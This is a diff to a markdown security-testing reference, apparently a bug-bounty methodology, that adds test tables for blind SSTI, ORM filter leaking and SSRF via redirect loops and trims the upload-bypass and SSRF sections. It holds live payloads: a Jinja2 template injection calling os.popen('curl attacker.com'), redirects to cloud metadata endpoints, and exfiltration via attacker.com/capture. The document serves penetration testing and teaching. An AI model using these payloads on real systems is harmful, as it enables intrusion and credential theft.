@@ -18,6 +18,9 @@ Advanced testing patterns for API-specific, GraphQL, JWT, OAuth, and specialized
 - [DNS Rebinding SSRF Bypass (TOCTOU)](#dns-rebinding-ssrf-bypass-toctou)
 - [React Server Components DoS](#react-server-components-dos)
 - [Vibe-Coded Application Attack Surface](#vibe-coded-application-attack-surface)
+- [Error-Based Blind SSTI Detection (PortSwigger #1)](#error-based-blind-ssti-detection-portswigger-1-2025)
+- [ORM Leaking via Search & Filter (PortSwigger #2)](#orm-leaking-via-search--filter-portswigger-2-2025)
+- [SSRF via HTTP Redirect Loops (PortSwigger #3)](#ssrf-via-http-redirect-loops-portswigger-3-2025)
 
 > **Infrastructure & platform patterns** (CSS exfiltration, SSRF chains, Node.js bypass, remote desktop, MDM, webmail RCE, critical infra auth bypass, MotW bypass): See [infrastructure-vulns.md](infrastructure-vulns.md)
 
@@ -412,64 +415,80 @@ For full AI/LLM hunting methodology, see the **ai-hunting** skill.
 
 ---
 
-## Filename Canonicalization + TOCTOU Upload Bypass
+## Error-Based Blind SSTI Detection (PortSwigger #1, 2025)
 
-**What it is:** File upload validation that checks the filename at upload time but processes a different canonical form later — enabling extension filter bypass via Unicode characters, null bytes, or encoding inconsistencies that survive validation but are stripped during storage or execution.
+**What it is:** Blind server-side template injection where rendered output is not directly visible — detected via error-based techniques and polyglot payloads that trigger distinguishable errors across template engines. Named **#1 web hacking technique of 2025** by PortSwigger.
 
-**Key CVE:** CVE-2026-28289 (FreeScout, CVSS 10.0, zero-click RCE) — Zero-Width Space character (U+200B) inserted into filename passes extension validation (`.php\u200B` ≠ `.php`) but is stripped when the file is written to disk, resulting in a valid `.php` file. Chained with email attachment processing for zero-click exploitation.
+**Why it matters:** Traditional SSTI detection relies on seeing `49` in the response when injecting `{{7*7}}`. Error-based detection works when output is consumed internally (emails, PDFs, logs, background jobs, admin dashboards) — dramatically expanding the SSTI attack surface.
 
-**Why it matters:** This is a **generalized pattern** beyond one CVE. Any file upload system that validates the filename in one form but stores/executes it in another canonical form is vulnerable. The TOCTOU gap between validation and storage is the root cause.
-
-**Where to look:**
-- File upload endpoints (profile pictures, attachments, imports, document uploads)
-- Email attachment processing (helpdesks, ticketing systems, CRMs)
-- Any system that sanitizes filenames after validation rather than before
-- Self-hosted apps with file-based execution (PHP, JSP, ASP)
+**Where to look:** Email template editors, PDF generators, report builders, notification systems, admin dashboards, any feature where user input is processed by a template engine but output is not directly returned in the HTTP response.
 
 **Test patterns:**
 
 | # | Test | What to do | What to look for |
 |---|------|-----------|-----------------|
-| 1 | Zero-Width Space injection | Upload `shell.ph\u200Bp` or `shell.p\u200Bhp` — insert U+200B within the extension | File saved as `shell.php` after invisible char stripped |
-| 2 | Zero-Width Non-Joiner | Try U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM) in filename | Any invisible Unicode stripped between validation and storage |
-| 3 | Right-to-Left Override | Use U+202E to visually reverse extension: `shell\u202Ephj.php` appears as `shell.jhp` | Filename canonicalized to executable extension |
-| 4 | Null byte truncation | Upload `shell.php%00.jpg` or `shell.php\x00.jpg` | Extension check sees `.jpg`, file stored as `shell.php` |
-| 5 | Double extension + config | Upload `shell.php.jpg` — check if server has `AddHandler` for `.php` anywhere in name | Apache processes file as PHP despite `.jpg` extension |
-| 6 | Case normalization gap | Upload `shell.PHP` on case-insensitive filesystem with case-sensitive validation | Validation allows `.PHP`, server executes as PHP |
+| 1 | Polyglot detection payload | Inject `${{<%[%'"}}%\` across all input fields | Different error messages reveal which template engine is in use (Jinja2, Twig, Freemarker, Velocity, Pebble, etc.) |
+| 2 | Error differential | Compare error responses between `{{7*7}}` and `{{7*'7'}}` | Type error on string multiplication → Jinja2/Twig; no error → not a template context |
+| 3 | Blind callback | Inject engine-specific payloads that trigger DNS/HTTP callbacks: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('curl attacker.com')}}` | DNS/HTTP hit from target server confirms blind SSTI |
+| 4 | Error-based engine fingerprint | Inject invalid syntax for each engine and compare 500/400 patterns | Engine-specific error messages leak template engine identity |
+| 5 | Time-based detection | Inject `{{range(99999999)}}` or engine-specific loops | Response delay confirms server-side evaluation |
 
-**Key principle:** The TOCTOU gap between "what the validator sees" and "what the filesystem stores" is the vulnerability. Test every invisible or transformable character class — not just Zero-Width Space.
+**Severity Guidance:** Critical when escalating to RCE. The error-based approach is the key innovation — enables finding SSTI in contexts where traditional reflected detection fails. Combine with the polyglot detection toolkit (open-source, PortSwigger 2025) for systematic coverage.
 
-**Severity Guidance:** Critical when chaining to RCE via webshell upload. High when bypassing extension restrictions to store executable content. The zero-click variant (email attachments) is Critical because no user interaction is required.
+---
+
+## ORM Leaking via Search & Filter (PortSwigger #2, 2025)
+
+**What it is:** Exploiting ORM (Object-Relational Mapping) search and filtering capabilities to extract data from columns/relationships the application doesn't intend to expose. A **generic methodology** that works across ORMs (Django, Rails ActiveRecord, Sequelize, Prisma, SQLAlchemy, Hibernate) rather than targeting a specific framework. Named **#2 web hacking technique of 2025** by PortSwigger.
+
+**Why it matters:** Modern APIs frequently expose filtering/search parameters that map directly to ORM query builders. Developers assume the ORM layer provides security, but filter parameters often allow querying columns and relationships beyond the intended scope.
+
+**Where to look:** Any API with search/filter/sort parameters, especially REST APIs with query parameters like `?filter[field]=value`, `?sort=field`, `?search=term`, `?where[field]=value`, or GraphQL with filter arguments.
+
+**Test patterns:**
+
+| # | Test | What to do | What to look for |
+|---|------|-----------|-----------------|
+| 1 | Hidden column enumeration | Add filter parameters for sensitive columns: `?filter[password_hash]=a*`, `?filter[api_key]=sk-*`, `?filter[role]=admin` | Filtering works on columns not shown in API response — data leaks via boolean oracle |
+| 2 | Relationship traversal | Filter through relationships: `?filter[user.email]=victim@corp.com`, `?filter[orders.total][gt]=1000` | Access to related model data through ORM eager loading |
+| 3 | Sort-based extraction | Sort by hidden columns: `?sort=password_hash` or `?sort=-secret_key` | Response ordering reveals relative values of hidden fields |
+| 4 | Wildcard/pattern matching | Use ORM pattern operators: `?filter[email][like]=%@competitor.com`, `?filter[name][startswith]=A` | Pattern matching on fields confirms their existence and enables extraction |
+| 5 | Aggregate leaking | Test for aggregate endpoints: `?filter[salary][gt]=100000&count=true` | Count/aggregate responses leak statistical data about hidden columns |
+| 6 | Nested include expansion | Request related objects: `?include=user.role,user.sessions,user.api_keys` | ORM includes related objects not intended for the current user |
+
+**Key principle:** The ORM trusts the application to restrict which fields are queryable, but many frameworks auto-generate filter capabilities for all model fields. Test every model field and relationship — not just the ones returned in the response. Boolean-based extraction (filter returns results or doesn't) enables extracting sensitive data character-by-character.
+
+**Severity Guidance:** High when leaking PII or credentials via boolean oracle. Critical when extracting admin API keys or bypassing access controls via relationship traversal. Report as information disclosure (CWE-200) or broken access control (CWE-639).
+
+---
+
+## SSRF via HTTP Redirect Loops (PortSwigger #3, 2025)
+
+**What it is:** Technique that converts blind SSRF into visible SSRF by exploiting HTTP redirect loop behavior — when a server follows redirects, the redirect chain itself becomes an information channel. Named **#3 web hacking technique of 2025** by PortSwigger.
+
+**Why it matters:** Blind SSRF is often marked as low/informational severity because the attacker can't see the response. Redirect loops change this by making the server's internal network visible through redirect chain metadata (timing, error messages, redirect counts).
+
+**Where to look:** Any SSRF endpoint that follows HTTP redirects — webhook validators, URL preview/unfurl features, image proxies, link checkers, import-by-URL features, PDF generators.
+
+**Test patterns:**
+
+| # | Test | What to do | What to look for |
+|---|------|-----------|-----------------|
+| 1 | Redirect to internal services | Set up redirect chain: `attacker.com/redir` → 302 to `http://169.254.169.254/latest/meta-data/` | Server follows redirect to internal service; response content or error reveals data |
+| 2 | Redirect loop port scan | Create redirect chain that cycles through internal ports: `attacker.com/scan?port=N` → 302 to `http://127.0.0.1:N/` | Different response times or error messages per port reveal open/closed status |
+| 3 | Chained redirect exfiltration | Redirect to internal service, then redirect response back to attacker: `internal:8080` → 302 to `attacker.com/capture?data=RESPONSE` | Internal service response data captured in redirect URL parameters |
+| 4 | Redirect count differential | Compare redirect behavior for existing vs non-existing internal hosts | Different redirect counts or timeout behavior reveals internal network topology |
+
+**Severity Guidance:** High when converting blind SSRF to visible — this is the upgrade technique that turns informational findings into impactful reports. Combine with DNS rebinding (see [DNS Rebinding SSRF Bypass](#dns-rebinding-ssrf-bypass-toctou)) for maximum coverage. Cross-reference: [infrastructure-vulns.md → SSRF via Webhook](infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints) for the March 2026 CVE cluster.
+
+---
+
+## Filename Canonicalization + TOCTOU Upload Bypass
+
+> **Canonical source:** See [parser-differentials.md → Filename Canonicalization](parser-differentials.md#filename-canonicalization) for full test patterns (U+200B, ZWNJ, RTLO, null byte, double extension, case folding). Key CVE: CVE-2026-28289 (FreeScout, CVSS 10.0, zero-click RCE via Zero-Width Space in attachment filename).
 
 ---
 
 ## SSRF Validation Gap Pattern (Webhook/Notification/Import)
 
-**What it is:** SSRF filters that validate hostnames against loopback addresses (`127.0.0.1`, `::1`) but fail to block RFC 1918 private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) or cloud metadata endpoints.
-
-**Key CVEs (March 2026 cluster — 5 SSRFs in 1 week):**
-- CVE-2026-29332 (Soft Serve Git, CVSS 9.1) — LFS endpoint SSRF to internal services
-- CVE-2026-29335 (Ghostfolio, CVSS 9.3) — asset import → AWS IMDS credential theft
-- CVE-2026-28291 (Wallos, CVSS 8.8) — notification tester SSRF
-- CVE-2026-28293 (Plane, CVSS 8.5) — webhook URL SSRF
-- CVE-2026-28294 (PinchTab, CVSS 7.5) — download endpoint SSRF
-
-**Common root cause:** Validators check `is_loopback` but not private range membership. Many validation libraries default to blocking only `127.0.0.1` and `::1`.
-
-**Where to look:**
-- Webhook configuration (Slack, Discord, custom webhook URLs)
-- Notification tester endpoints ("Send test notification")
-- Asset/file import via URL (image import, RSS feed, URL preview)
-- Download/export features that fetch external resources
-
-**Test patterns:**
-
-| # | Test | What to do | What to look for |
-|---|------|-----------|-----------------|
-| 1 | RFC 1918 bypass | Request `http://10.0.0.1/`, `http://172.16.0.1/`, `http://192.168.1.1/` | Internal service responses (loopback blocked but private IPs aren't) |
-| 2 | Cloud metadata | Request `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP) | IAM credentials, instance metadata |
-| 3 | IPv6 mapped addresses | Request `http://[::ffff:10.0.0.1]/` or `http://[0:0:0:0:0:ffff:a00:1]/` | IPv4 private address reached via IPv6 notation |
-| 4 | Decimal/octal IP encoding | Request `http://2130706433/` (127.0.0.1 as decimal) or `http://0177.0.0.1/` (octal) | Loopback reached via non-standard encoding |
-| 5 | Redirect chain | Host `http://attacker.com/redirect` → 302 to `http://10.0.0.1/` | Validator checks initial URL, follows redirect to internal |
-
-**Severity Guidance:** Critical when cloud metadata credentials are accessible (IMDS → full account compromise). High when internal services are reachable. The pattern is systematic — if one webhook/import endpoint is vulnerable, test ALL URL-accepting endpoints on the same application.
+> **Canonical source:** See [infrastructure-vulns.md → SSRF via Webhook, Notification, and Import Endpoints](infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints) for full test patterns (RFC 1918 bypass, cloud metadata, IPv6 mapped, decimal/octal encoding, redirect chains) and March 2026 CVE cluster (5 SSRFs in 1 week).
